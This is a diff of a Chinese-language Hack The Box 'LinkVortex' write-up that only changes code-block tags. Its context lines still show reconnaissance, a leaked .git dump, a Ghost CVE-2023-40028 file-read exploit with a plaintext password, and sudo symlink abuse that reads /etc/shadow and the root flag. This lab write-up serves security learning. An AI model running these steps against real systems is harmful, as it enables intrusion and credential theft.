@@ -16,7 +16,7 @@ Operating System: Linux
 
 ## 信息搜集
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ sudo nmap -v --min-rate=2000 -A -p- 10.10.11.47
 Nmap scan report for bogon (10.10.11.47)
@@ -47,7 +47,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 同时尝试爆破子域名
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 200 --append-domain -u http://linkvortex.htb/
 ===============================================================
@@ -93,7 +93,7 @@ Finished
 
 尝试对其进行目录爆破
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ dirsearch -u http://dev.linkvortex.htb/
 [08:43:37] 301 -  239B  - /.git  ->  http://dev.linkvortex.htb/.git/
@@ -119,7 +119,7 @@ Finished
 
 尝试将 `git` 储存库 dump 到本地
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/tmp/Hackthebx-LinkVortex]
 └─$ python3 ~/tools/GitHack/GitHack.py http://dev.linkvortex.htb/.git/
 ......
@@ -127,7 +127,7 @@ Finished
 
 在 dump 过程中可以发现，git 储存库存在有大量的数据丢失，最终只获得了以下信息
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/tmp/Hackthebx-LinkVortex]
 └─$ tree -a
 .
@@ -224,7 +224,7 @@ email: 'not-invited@example.org',
 
 ## Ghost CMS CVE-2023-40028
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/tools/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028]
 └─$ ./CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb
 WELCOME TO THE CVE-2023-40028 SHELL
@@ -301,7 +301,7 @@ node:x:1000:1000::/home/node:/bin/bash
 
 尝试使用上文得到的凭据登录到 SSH
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/tools/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028]
 └─$ pwncat-cs bob@linkvortex.htb
 [09:11:22] Welcome to pwncat 🐈!
@@ -320,7 +320,7 @@ bob
 
 ## 提权至 root
 
-```shell
+```bash
 (remote) bob@linkvortex:/home/bob$ getcap -r / 2>/dev/null
 /usr/bin/ping cap_net_raw=ep
 (remote) bob@linkvortex:/home/bob$ sudo -l
@@ -382,7 +382,7 @@ fi
 
 可以尝试使用这个脚本实现任意文件读取
 
-```shell
+```bash
 (remote) bob@linkvortex:/home/bob$ ln -s /etc/shadow shadow
 (remote) bob@linkvortex:/home/bob$ ln -s /home/bob/shadow shadow.png
 (remote) bob@linkvortex:/home/bob$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
@@ -421,7 +421,7 @@ _laurel:!:20057::::::
 
 这个方案可以直接读取到 `root` 用户的 `.ssh` 文件夹中的私钥文件，也可以直接读取到 flag
 
-```shell
+```bash
 (remote) bob@linkvortex:/home/bob$ ln -s /root/root.txt flag
 (remote) bob@linkvortex:/home/bob$ ln -s /home/bob/flag flag.png
 (remote) bob@linkvortex:/home/bob$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
